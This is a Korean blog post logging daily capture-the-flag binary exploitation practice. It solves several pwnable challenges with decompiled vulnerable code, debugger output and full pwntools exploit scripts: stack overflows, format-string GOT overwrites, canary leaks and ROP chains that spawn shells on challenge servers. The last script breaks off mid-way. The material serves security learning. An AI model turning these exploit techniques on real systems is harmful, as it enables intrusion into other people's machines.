---
layout: post
date: 2021-01-25 00:00:03
title: "Pwnable Exploitation"
categories: Pwnable
tags: [PWN]
author:
  - Jeongwon Jo
---
<strong>앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.</strong><br>

---
## PWN D+1 (2021.01.25)<br>

---
Pwnable.kr Challenge : BOF

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

<strong>처음 풀어 볼 문제는 Pwnable.kr의 BOF라는 문제입니다. func 함수를 보면 key의 값이 `0xcafebabe`이면 system 함수를 호출하는 것을 볼 수 있습니다. BOF를 이용해서 key 값을 `0xcafebabe` 바꿔주면 될 거 같습니다.</strong><br>

![](https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true)

<strong>func 중간에 브레이크 포인트를 걸어 key의 주소를 확인해보면 13 + 4 = 52만큼 떨어져 있는 것을 볼 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("pwnable.kr", 9000)

payload = b"a" * 52
payload += p32(0xcafebabe)

p.sendline(payload)
p.interactive()
```

> FLAG : daddy, I just pwned a buFFer :)

---
HackCTF Challenge : Basic_BOF #1

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+4h] [ebp-34h]
  int v5; // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
    puts("Shell closed! Bye.");
  }
  return 0;
}
```

<strong>따로 .c 파일이 주어지지 않아 IDA를 이용해서 코드로 변환해보니, v5의 값이 `0xDEADBEEF`면 system 함수를 호출하는 것을 볼 수 있습니다. 이번 문제도 BOF를 이용해서 v5의 값을 `0xDEADBEEF`로 바꿔주면 될 거 같습니다.</strong><br>

```
v5  = 34h - Ch
v5 = 40
```
<strong>v5는 s와 40만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3000)

payload = b'a' * (52 - 12)
payload += p32(0xDEADBEEF)

p.sendline(payload)
p.interactive()
```

> FLAG : HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}

---
HackCTF Challenge : Basic_BOF #2

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-8Ch]
  void (*v5)(void); // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(&s, 133, stdin);
  v5();
  return 0;
}

(...)

int shell()
{
  return system("/bin/dash");
}

// shell addr : 0x804849B
```
<strong>1번과 마찬가치로 IDA를 이용해서 코드로 변환해주었습니다. 코드를 보니 문자열 변수 s와 함수 포인터 v5를 정의하는 것을 볼 수 있습니다. 그리고 마지막에는 v5 함수를 호출하고 있습니다. BOF 취약점을 이용해서 v5 포인터 변수의 값으로 shell 함수의 주소를 넣어주면 v5 함수를 호출 할 때 shell 함수가 호출이 될 것 입니다.</strong><br>

```
*v5 = 8Ch - Ch
*v5 = 128
```
<strong>*v5는 s와 128만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3001)

payload = b'a' * 128
payload += p32(0x804849B)

p.sendline(payload)
p.interactive()
```

> FLAG : HackCTF{h3y_dud3_600d_f0r_y0u}

---
HackCTF Challenge : Basic_FSB

```c
// main

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  vuln();
  return 0;
}
```

```c
// vuln

int vuln()
{
  char s; // [esp+0h] [ebp-808h]
  char format; // [esp+400h] [ebp-408h]

  printf("input : ");
  fgets(&s, 1024, stdin);
  snprintf(&format, 0x400u, &s);
  return printf(&format);
}
```

```c
// flag()

int flag()
{
  puts("EN)you have successfully modified the value :)");
  puts(aKr);
  return system("/bin/sh");
}
```
<strong>IDA를 이용해서 코드로 변환을 해주었습니다. main 함수를 보면 vuln 함수를 호출하고 있고, vulln 함수를 보면 snprintf 함수에서 두 번째 매개변수로 서식 문자가 정의되어 있지 않아 FSB 취약점이 발생합니다. 그래서 FSB 취약점을 이용해서 printf 함수의 got를 flag 함수의 주소로 덮어주면 printf 함수가 실행될 때, flag 함수가 실행이 될 것 입니다.</strong><br>

```
root@py:~/pwn/HackCTF/B_F# ./basic_fsb
input : aaaa.%x.%x.%x.%x.%x
aaaa.f7fc5c75.61616161.2e78252e.252e7825.78252e78
root@py:~/pwn/HackCTF/B_F#

// gdb -q ./basic_fsb
gdb-peda$ x/i 0x80483d0
   0x80483d0 <printf@plt>:      jmp    DWORD PTR ds:0x804a00c
gdb-peda$ p flag
$2 = {<text variable, no debug info>} 0x80485b4 <flag>
gdb-peda$ 
```
<strong>바이너리 파일을 실행해서 오프셋을 확인해보니 두 번째 서식 문자에서 `aaaa`의 값이 출력되는 것을 볼 수 있고, printf got, flag 함수의 주소는 위와 같습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3002)

payload = fmtstr_payload(2, {0x804a00c:0x80485b4})

p.sendline(payload)
p.interactive()

# 32 비트에서는 fmtstr_payload 함수를 이용해도 잘 되지만 64 비트에서는 거의 안 됨.
# 처음 풀 때 어려워 했는데 이해하고 다시 보니, webhacking.kr 1번 문제 느낌.
```

> FLAG : HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}

---
PicoCTF Challenge : authenticate

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```
<strong>main 함수 else if 문을 보면 printf 함수를 호출하는 데 이때 FSB 취약점이 발생합니다. 그리고 flag는 read_flag 함수에서 authenticated의 값이 참이면 flag 함수를 호출해서 flag를 출력해줍니다. 즉 전역 변수인 authenticated의 값을 FSB 취약점을 이용해서 참(1)으로 변조하면 됩니다.</strong><br>

```
root@py:~/pwn/picoCTF# ./auth
Would you like to read the flag? (yes/no)
aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Received Unknown Input:

aaaa.80489a6.f7ec1580.804875a.f7ec1000.ff992024.ff992028.ff9920f4.3.0.0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.Sorry, you are not *authenticated*!
```
<strong>바이너리 파일을 이용해 오프셋을 확인해 보니 11인 것을 알 수 있었습니다.</strong><br>

```python
from pwn import *

p = remote("2018shell2.picoctf.com", 52918)
e = ELF("./auth")
auth = e.sym['authenticated']

payload = fmtstr_payload(11, {auth:1})
p.sendline(payload)
p.interactive()
```

> FLAG : picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}

---
## PWN D+2 (2021.01.26)<br>

---
Plaid CTF 2013 - Challenge : ropasaurusrex 

<strong>이번에 풀어 볼 문제는 Plaid CTF 2013에서 나온 32 bit ROP 문제입니다. 32 bit ROP를 이해하고, 풀어보니 포너블 뉴비분들은 재밌게 풀 수 있을 거 같습니다. 일단 IDA를 이용해서 바이너리를 코드로 변환 시켜 주겠습니다.</strong><br>

```c
ssize_t __cdecl main()
{
  sub_80483F4();
  return write(1, "WIN\n", 4u);
}
```
<strong>main() 함수를 보면 sub_80483F4() 함수를 호출하고, `WIN`을 출력하고 끝나는 것을 볼 수 있습니다.</strong><br>

```c
ssize_t sub_80483F4()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```
<strong>sub_80483F4() 함수를 보면 buf라는 변수를 정의하고, read 함수를 이용해서 buf의 입력 받고 있습니다. 하지만 buf의 크기는 88h인데 read() 함수에세ㅓ 100h 만큼 입력 받고 있기 때문에 BOF 취약점이 발생합니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ ./ropasaurusrex 
AAAA
WIN
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ 
```
<strong>위 결과는 바이너리 파일을 실행시킨 것 입니다. 입력을 받고, `WIN`을 출력함과 동시에 종료되는 것을 볼 수 있습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ checksec --file=ropasaurusrex
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		ropasaurusrex
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ 
```
<strong>위 결과는 checksec를 이용해 보호 기법을 확인한 결과인데, 보면 NX Bit가 활성화 되어 있는 것을 볼 수 있습니다. NX Bit가 활성화 되어 있기 때문에 BOF 취약점을 이용해서 buf에 쉘코드를 삽입하고, ret에 buf를 준다고해도 실행 권한이 없어 실행되지 않을 것 입니다. 하지만 ROP를 이용해서 NX Bit를 우회해 익스를 진행할 수 있습니다.</strong><br>

```
gdb-peda$ disas read
Dump of assembler code for function read@plt:
   0x0804832c <+0>:	jmp    DWORD PTR ds:0x804961c
   0x08048332 <+6>:	push   0x18
   0x08048337 <+11>:	jmp    0x80482ec
End of assembler dump.
gdb-peda$ disas write
Dump of assembler code for function write@plt:
   0x0804830c <+0>:	jmp    DWORD PTR ds:0x8049614
   0x08048312 <+6>:	push   0x8
   0x08048317 <+11>:	jmp    0x80482ec
End of assembler dump.
gdb-peda$

// read got  : 0x0804961c
// read plt  : 0x0804832c
// write got : 0x08049614
// write plt : 0x0804830c
```
<strong>gdb를 이용해서 read/write의 plt/got를 알아냈습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d ropasaurusrex | grep -B4 "ret"
(생략)
--
 80484b5:	5b                   	pop    %ebx
 80484b6:	5e                   	pop    %esi
 80484b7:	5f                   	pop    %edi
 80484b8:	5d                   	pop    %ebp
 80484b9:	c3                   	ret    
 80484ba:	8b 1c 24             	mov    (%esp),%ebx
 80484bd:	c3                   	ret    
--
(생략)

// pop pop pop r : 0x080484b6
```
<strong>objdump를 이용해서 pppr을 알아냈습니다 pppr을 구하는 이유는 read/write 함수의 인자는 3개이기 때문입니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d /lib32/libc.so.6 | grep __read
(생략)
   df11b:	e8 00 65 00 00       	call   e5620 <__read@@GLIBC_2.0>
   df27a:	e8 a1 63 00 00       	call   e5620 <__read@@GLIBC_2.0>
   df42e:	e8 ed 61 00 00       	call   e5620 <__read@@GLIBC_2.0>
000e5620 <__read@@GLIBC_2.0>:
   e5639:	75 1d                	jne    e5658 <__read@@GLIBC_2.0+0x38>
   e564c:	77 52                	ja     e56a0 <__read@@GLIBC_2.0+0x80>
   e5680:	77 28                	ja     e56aa <__read@@GLIBC_2.0+0x8a>
(생략)
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d /lib32/libc.so.6 | grep system
0003ce10 <__libc_system@@GLIBC_PRIVATE>:
   3ce24:	74 0a                	je     3ce30 <__libc_system@@GLIBC_PRIVATE+0x20>
00127030 <svcerr_systemerr@@GLIBC_2.0>:
  12708b:	75 04                	jne    127091 <svcerr_systemerr@@GLIBC_2.0+0x61>
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$

// read offset   : 0xe5620
// system offset : 0x3ce24
```
<strong>objdump를 이용해서 read/system offset을 구했습니다. read offset은 libc의 주소를 릭 하는데 사용되고, system offset은 나중에 system 주소를 릭할 때 사용됩니다.</strong><br>

```
libc = read_addr - read_offset
system = libc + system_offset
```
<strong>위와 같이 read addr에서 read offset을 빼주면 libc의 시작 주소가 나올 것이고, libc에서 system offset 만큼 더해주면 system 함수의 시작 주소가 나올 것 입니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -h ropasaurusrex 

ropasaurusrex:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
(생략)
 24 .bss          00000008  08049628  08049628  00000628  2**2
                  ALLOC
(생략)
```
<strong>마지막으로 objdump를 이용해서 `/bin/sh`을 저장할 bss 영역의 주소를 알아냈습니다</strong><br>


- 시나리오<br>

1. write 함수를 호출해서 read 주소를 릭한다. read 주소랑 read offset이랑 빼서 libc의 시작 주소를 구하고, libc의 시작 주소에 system offset을 더해서 system의 시작 주소를 구한다.<br>
2. read 함수를 호출해서 bss 영역에 `"/bin/sh"`을 넣어준다.
3. read 함수를 호출해서 read got의 system addr을 넣어준다.
4. read 함수를 호출하면 (3)에서 read got가 system addr로 덮였기 때문에 system 함수가 호출이 되고, 인자값으로는 bss를 넘겨준다. bss에는 `"/bin/sh"`가 들어있다.
<br>

```python
from pwn import *
from time import sleep

p = process("./ropasaurusrex")

read_plt = 0x0804832c
read_got = 0x0804961c
read_off = 0xe5620
write_plt = 0x0804830c
write_got = 0x08049614
pppr = 0x080484b6
dynamic = 0x08049530
system_off = 0x3ce10 

payload = "A" * (136 + 4) # buffer + sfp

# 시나리오 (1)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# 시나리오 (2)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(dynamic)
payload += p32(8)

# 시나리오 (3)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

# 시나리오 (4)
payload += p32(read_plt)
payload += p32(0x41414141)
payload += p32(dynamic)

p.send(payload)
sleep(1)

readaddr = u32(p.recv(4))
libc_base = readaddr - read_off
system = libc_base + system_off
print hex(libc_base)
print hex(system)

p.send("/bin/sh")
p.send(p32(system))
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ python exploit.py 
[+] Starting local process './ropasaurusrex': pid 8695
0xf7d6e000
0xf7daae10
[*] Switching to interactive mode
$ id
uid=1000(pocas) gid=1000(pocas) groups=1000(pocas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ cat key
you_cant_stop_the_ropasaurusrex
$  
```

> FLAG : you_cant_stop_the_ropasaurusrex

---
## PWN D+3 (2021.01.27)<br>

---
Codagate 2017 Challenge : BabyPwn

<strong>이번에는 Canary Leak + ROP를 이용한 문제를 풀어보겠습니다. 방금 Canary에 대해 공부를 하고, Canary 릭을 해서 푸는 문제가 없나 보니 코게 문제로 하나가 있어 풀어보겠습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ checksec --file=babypwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		babypwn
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ 
```
<strong>checksec을 이용해서 보호 기법을 확인해보니, 카나리와, NX Bit가 걸려있는 것을 확인할 수 있습니다.</strong><br>

```c
unsigned int __cdecl main(int a1, char **a2)
{
  socklen_t addr_len; // [esp+20h] [ebp-30h]
  int optval; // [esp+24h] [ebp-2Ch]
  int v5; // [esp+28h] [ebp-28h]
  struct sockaddr addr; // [esp+2Ch] [ebp-24h]
  struct sockaddr v7; // [esp+3Ch] [ebp-14h]
  unsigned int v8; // [esp+4Ch] [ebp-4h]

  v8 = __readgsdword(0x14u);
  if ( a1 == 2 )
    v5 = atoi(a2[1]);
  else
    v5 = 8181;
  dword_804B1BC = socket(2, 1, 0);
  if ( dword_804B1BC == -1 )
  {
    perror("[!] socket Error!");
    exit(1);
  }
  addr.sa_family = 2;
  *(_WORD *)addr.sa_data = htons(v5);
  *(_DWORD *)&addr.sa_data[2] = 0;
  bzero(&addr.sa_data[6], 8u);
  optval = 1;
  setsockopt(dword_804B1BC, 1, 2, &optval, 4u);
  if ( bind(dword_804B1BC, &addr, 0x10u) == -1 )
  {
    perror("[!] bind Error!");
    exit(1);
  }
  if ( listen(dword_804B1BC, 1024) == -1 )
  {
    perror("[!] listen Error!");
    exit(1);
  }
  while ( 1 )
  {
    while ( 1 )
    {
      addr_len = 16;
      fd = accept(dword_804B1BC, &v7, &addr_len);
      if ( fd != -1 )
        break;
      perror("[!] accept Error!");
    }
    if ( !fork() )
      break;
    close(fd);
    while ( waitpid(-1, 0, 1) > 0 )
      ;
  }
  sub_8048B87();
  close(dword_804B1BC);
  close(fd);
  return __readgsdword(0x14u) ^ v8;
}
```
<strong>IDA를 이용해 코드로 변환해주었습니다. main 함수를 보면 socket을 이용해서 8181 포트로 서버를 여는 것을 볼 수 있습니다. 2020년 1월쯤에 C 언어로 이용해서 소켓으로 서버 구축한 적이 있기 때문에 바로 알아 챌 수 있었습니다. 소켓을 생성하고 마지막에는 sub_8048B87 함수를 호출하는 것을 볼 수 있습니다.</strong><br>

```c
unsigned int sub_8048A71()
{
  int v1; // [esp+1Ch] [ebp-3Ch]
  char v2; // [esp+24h] [ebp-34h]
  unsigned int v3; // [esp+4Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&v2, 0, 0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        sub_80488B1("\n===============================\n");
        sub_80488B1("1. Echo\n");
        sub_80488B1("2. Reverse Echo\n");
        sub_80488B1("3. Exit\n");
        sub_80488B1("===============================\n");
        v1 = sub_804895A();
        if ( v1 != 1 )
          break;
        sub_80488B1("Input Your Message : ");
        sub_8048907(&v2, 100);
        sub_80488B1(&v2);
      }
      if ( v1 != 2 )
        break;
      sub_80488B1("Input Your Message : ");
      sub_8048907(&v2, 100);
      sub_80489C8(&v2);
      sub_80488B1(&v2);
    }
    if ( v1 == 3 )
      break;
    sub_80488B1("\n[!] Wrong Input\n");
  }
  return __readgsdword(0x14u) ^ v3;
}
```
<strong>sub_8048A71 함수를 보면 v1, v2, v3 변수를 정의하는 것을 볼 수 있고, v3은 카나리입니다. 하지만 1번 메뉴와 2번 메뉴를 확인해보면 v2의 크기는 40인데 100만큼 입력 받기 때문에 BOF 취약점이 발생합니다. NX Bit가 걸려 있기 때문에 BOF 취약점을 이용해서 ROP를 해주면 될 거 같고, 카나리가 걸려 있기 때문에 카나리부터 릭을 해야합니다.</strong><br>

```python
from pwn import *
p = remote("127.0.0.1", 8181)

# Canary Leak
p.sendlineafter("> ","1")
p.sendafter(": ", "a" * 41)
canary = u32("\x00" + p.recv(1024)[41:44])

log.info("Canary : {}".format(hex(canary)))
```
<strong>Canary는 위와 같이 릭을 할 수 있습니다. v2의 값으로 `"a"`를 40개 주게 되면 v2 변수가 꽉차 v3 변수와 이어지게 됩니다. 하지만 v2를 꽉 채워주지 않으면 남은 메모리에 Null 값이 삽입되기 때문에 Canary를 릭할 수 없습니다. 하지만 40개를 다 채워줬는데 Canary가 출력 되지 않는데 이는 Canary에 시작도 Null로 시작하기 때문입니다. 그래서 `"a"`를 41개를 줘 Canary에 시작인 Null 값도 덮으면 Canary 전체를 릭할 수 있습니다.(Null 값이 존재하면 더 이상 읽지 않음)</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ objdump -h babypwn 

babypwn:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn

(생략)
 24 .bss          0000000c  0804b1b4  0804b1b4  000021b4  2**2
                  ALLOC
(생략)
```
<strong>objdump를 이용해 bss를 구했습니다.</strong><br>


```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ gdb -q ./babypwn
Reading symbols from ./babypwn...(no debugging symbols found)...done.
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x8048620 <system@plt>
gdb-peda$ 
```
<strong>그리고 해당 파일에 system 함수가 존재하기 때문에 libc를 따로 구하지 않아도 될 거 같습니다. 이제 Canary를 릭하고, system 함수가 존재하는 것을 알았기 때문에 ROP를 해보겠습니다.</strong><br>

- 시나리오<br>

1. 카나리를 릭한다 (Null 값 조심).
2. recv 함수를 이용해서 bss에 Command를 넣어준다. (bss에 값을 넣어줄 수 있는 함수가 recv 함수뿐이 없다)
3. system 함수의 인자로 bss를 넘겨준다. bss에는 `/bin/sh <&4 >&0`가 들어있다. <br>

```python
from pwn import *

p = remote("141.164.52.207", 8181)
E = ELF("./babypwn")

# Canary Leak
p.sendlineafter("> ","1")
p.sendafter(": ", "a" * 41)
canary = u32("\x00" + p.recv(1024)[41:44])

log.info("Canary : {}".format(hex(canary)))

ppppr = 0x8048eec
bss = E.bss()
system_plt = E.plt['system']
recv_plt = E.plt['recv']

command = "/bin/sh <&4 >&0"
log.info("bss : {}".format(hex(bss)))

p.close()

# ROP Exploitation
p = remote("141.164.52.207", 8181)

# ROP Channing
payload = "a" * 40
payload += p32(canary)
payload += "a" * 12 # Dummy[8] + SFP[4]

payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(4)
payload += p32(bss)
payload += p32(len(command)+1)
payload += p32(0)

payload += p32(system_plt)
payload += "a" * 4
payload += p32(bss)

p.sendlineafter("> ", "1")
p.sendlineafter(": ", payload)

# Exit -> RET 
p.sendlineafter("> ", "3")

p.sendline(command)
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ python exploit.py 
[+] Opening connection to 141.164.52.207 on port 8181: Done
[*] '/home/pocas/pwn/Codagate 2017/babypwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Canary : 0x72c6c200
[*] bss : 0x804b1b4
[*] Closed connection to 141.164.52.207 port 8181
[+] Opening connection to 141.164.52.207 on port 8181: Done
[*] Switching to interactive mode
$ cat flag
FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}
$  
```

> FLAG : FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}

---
## PWN D+4 (2021.01.28)<br>

---
Codagate 2018 Challenge : BaskinRobins31

<strong>오늘은 64 Bit ROP 익스를 공부하고, 좀 쉬운 문제가 없나 보다가 코게 2018에서 나온 BaskinRobins31라는 문제가 있어 풀어보겠습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ checksec --file=BaskinRobins31
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols	  No	0		3		BaskinRobins31
pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ 
```
<strong>checksef을 이용해서 보호 기법을 확인해보니 RELRO와 NX Bit가 걸려있는 것을 볼 수 있습니다. NX Bit를 우회하기 위해 ROP를 이용해 익스를 진행하면 될 거 같고, Partial RELRO이기 때문에 GOT Overwrite가 가능합니다.</strong><br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v5; // [rsp+8h] [rbp-8h]
  _BOOL4 v6; // [rsp+Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = time(0LL);
  srand(v3);
  v5 = 31;
  v6 = 0;
  puts("### This game is similar to the BaskinRobins31 game. ###");
  puts("### The one that take the last match win ###");
  printf("There are %u number(s)\n", 31LL);
  while ( (signed int)v5 > 0 )
  {
    if ( v6 )
    {
      my_turn(&v5);
      v6 = 0;
    }
    else
    {
      v6 = (unsigned __int64)your_turn(&v5) != 0;
    }
    printf("remaining number(s) : %i \n", v5);
  }
  if ( v6 )
  {
    puts("Wow! You win!");
    puts("Hint is : ROP");
  }
  else
  {
    puts("You lose!");
  }
  return 0;
}
```
<strong>코드를 보면 while 문 안에 v6의 값이 참이 아니면 else 문으로 들어가 your_turn 함수를 호출하는 것을 볼 수 있습니다.</strong><br>

```c
signed __int64 __fastcall your_turn(_DWORD *a1)
{
  signed __int64 result; // rax
  char s; // [rsp+10h] [rbp-B0h]
  size_t n; // [rsp+B0h] [rbp-10h]
  int v4; // [rsp+BCh] [rbp-4h]

  v4 = 0;
  memset(&s, 0, 0x96uLL);
  puts("How many numbers do you want to take ? (1-3)");
  n = read(0, &s, 0x190uLL);
  write(1, &s, n);
  putchar(10);
  v4 = strtoul(&s, 0LL, 10);
  if ( (unsigned int)check_decision((unsigned int)(char)v4, 0LL) )
  {
    *a1 -= v4;
    result = 1LL;
  }
  else
  {
    puts("Don't break the rules...:( ");
    result = 0LL;
  }
  return result;
}
```
<strong>your_turn 함수를 보면 read 함수를 이용해서 s 값을 입력 받고, write 함수를 이용해서 출력해주는 것을 볼 수 있습니다. 하지만 s는 memset 함수를 이용해서 150 사이즈만큼 초기화 시켜주는데 read 함수에서는 400만큼 입력을 받고 있어 BOF 취약점이 발생합니다. RET까지 덮을려면 s[176] + sfp[8]만큼 덮어주면 됩니다. 이제 가젯들을 구해보겠습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ objdump -d BaskinRobins31 | grep -B4 "ret"
(생략)
--
  400877:	48 89 e5             	mov    %rsp,%rbp
  40087a:	5f                   	pop    %rdi
  40087b:	5e                   	pop    %rsi
  40087c:	5a                   	pop    %rdx
  40087d:	c3                   	retq   
  40087e:	90                   	nop
  40087f:	5d                   	pop    %rbp
  400880:	c3                   	retq   
--
(생략)
```
<strong>objdump를 이용해서 가젯을 찾아보니 pop pop pop ret 가젯을 있는 것을 확인할 수 있습니다. 그리고 system 함수에서 사용할 pop ret 가젯도 그냥 pppr 가젯에서 2를 더한 것을 사용하려 했는데 이를 이용하니 잘 되지 않았습니다.</strong><br>

```
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400bc3 : (b'5fc3')	pop rdi; ret
0x0040087a : (b'5f5e5ac3')	pop rdi; pop rsi; pop rdx; ret
gdb-peda$ 
```
<strong>그래서 ropsearch 명령어를 이용해서 pop rdi; ret 가젯을 찾아서 이를 이용했습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ objdump -h BaskinRobins31 

BaskinRobins31:     file format elf64-x86-64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
(생략)
 25 .bss          00000020  0000000000602090  0000000000602090  00002088  2**4
                  ALLOC
(생략)
```
<strong>마지막으로 objdump를 이용해서 bss를 구했습니다. 나머지 got/plt/offset은 pwntools를 이용해서 구할 수 있습니다.</strong><br>

- 시나리오<br>

1. write 함수를 이용해서 read 주소를 릭하고, 이를 이용해서 libc_base를 구한다.
2. read 함수를 이용해서 bss에 쉘을 넣어준다.
3. read 함수를 이용해서 read got를 system 함수로 체이닝 해준다.
4. read 함수를 호출하고, 이때 인자로는 bss를 넘겨준다. bss에는 `/bin/sh`가 들어있다.<br>

```python
from pwn import *

p = process("./BaskinRobins31")
e = ELF("./BaskinRobins31")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

read_plt = e.plt['read'] 
read_got = e.got['read']
write_plt = e.plt['write']
bss = e.bss()
pppr = 0x40087a
pr = 0x00400bc3


log.info('pppr : {}'.format(hex(pppr)))
log.info('bss : {}'.format(hex(bss)))
log.info('read_plt : {}'.format(hex(read_plt)))
log.info('read_got : {}'.format(hex(read_got)))
log.info('write_plt : {}'.format(hex(write_plt)))
log.info('system_offset : {}'.format(hex(system_offset)))
log.info('read_offset : {}'.format(hex(read_offset)))

# BOF
payload = "A" * 184 # Buffer + SFP

# ROP Channing

# read(1, read_got, 8);
payload += p64(pppr)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(write_plt)

payload += p64(pppr)
payload += p64(0)
payload += p64(bss)
payload += p64(8)
payload += p64(read_plt)

payload += p64(pppr)
payload += p64(0)
payload += p64(read_got)
payload += p64(8)
payload += p64(read_plt)

payload += p64(pr)
payload += p64(bss)
payload += p64(read_plt)

p.sendlineafter("(1-3)\n", payload)

leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = leak - read_offset
